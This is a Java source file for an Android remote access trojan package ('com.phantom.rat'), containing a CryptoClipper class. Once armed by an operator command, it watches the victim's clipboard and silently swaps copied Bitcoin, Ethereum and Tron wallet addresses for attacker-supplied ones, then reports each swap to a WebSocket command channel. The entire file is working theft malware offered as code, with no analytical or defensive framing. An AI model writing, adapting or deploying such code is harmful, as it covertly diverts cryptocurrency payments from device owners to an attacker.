package com.phantom.rat;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;

import org.json.JSONObject;

import java.util.regex.Pattern;

public final class CryptoClipper {
    private static final Pattern BTC = Pattern.compile("(?i)\\b(bc1[a-z0-9]{25,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\\b");
    private static final Pattern ETH = Pattern.compile("\\b0x[a-fA-F0-9]{40}\\b");
    private static final Pattern TRX = Pattern.compile("\\bT[1-9A-HJ-NP-Za-km-z]{33}\\b");
    private static boolean registered = false;
    private static volatile boolean enabled = false;

    private CryptoClipper() {}

    public static String enable(Context ctx, String args) {
        try {
            JSONObject o = new JSONObject(args == null || args.isEmpty() ? "{}" : args);
            SharedPreferences prefs = ctx.getSharedPreferences("phantom", Context.MODE_PRIVATE);
            prefs.edit()
                    .putString("w_eth", o.optString("eth", ""))
                    .putString("w_btc", o.optString("btc", ""))
                    .putString("w_trx", o.optString("trx", ""))
                    .apply();
            enabled = true;
            register(ctx);
            return "clipper armed";
        } catch (Exception e) {
            return "clipper error: " + e.getMessage();
        }
    }

    private static void register(Context ctx) {
        if (registered) return;
        registered = true;
        new Handler(Looper.getMainLooper()).post(() -> {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null) return;
            cm.addPrimaryClipChangedListener(() -> {
                if (!enabled) return;
                try {
                    if (!cm.hasPrimaryClip()) return;
                    ClipData.Item it = cm.getPrimaryClip().getItemAt(0);
                    CharSequence cs = it.getText();
                    if (cs == null) return;
                    String text = cs.toString();
                    SharedPreferences prefs = ctx.getSharedPreferences("phantom", Context.MODE_PRIVATE);
                    String out = text;
                    String swapped = null;
                    if (text.matches(".*0x[a-fA-F0-9]{40}.*")) {
                        String w = prefs.getString("w_eth", "");
                        if (!w.isEmpty() && !text.contains(w)) { out = ETH.matcher(out).replaceAll(w); swapped = "ETH"; }
                    } else if (text.matches(".*(?i)bc1[a-z0-9]{25,59}.*")
                            || text.matches(".*[13][a-km-zA-HJ-NP-Z1-9]{25,34}.*")) {
                        String w = prefs.getString("w_btc", "");
                        if (!w.isEmpty() && !text.contains(w)) { out = BTC.matcher(out).replaceAll(w); swapped = "BTC"; }
                    } else if (text.matches(".*T[1-9A-HJ-NP-Za-km-z]{33}.*")) {
                        String w = prefs.getString("w_trx", "");
                        if (!w.isEmpty() && !text.contains(w)) { out = TRX.matcher(out).replaceAll(w); swapped = "TRX"; }
                    }
                    if (swapped != null) {
                        cm.setPrimaryClip(ClipData.newPlainText("text", out));
                        WebSocketClient w = WebSocketClient.getInstance();
                        if (w != null) w.sendLog("clipper", "swapped " + swapped + " -> " + shortAddr(prefs));
                    }
                } catch (Exception ignored) {}
            });
        });
    }

    private static String shortAddr(SharedPreferences p) {
        String a = p.getString("w_eth", "");
        if (a.isEmpty()) a = p.getString("w_btc", "");
        if (a.isEmpty()) a = p.getString("w_trx", "");
        return a.isEmpty() ? "?" : a.substring(0, Math.min(10, a.length())) + "…";
    }
}
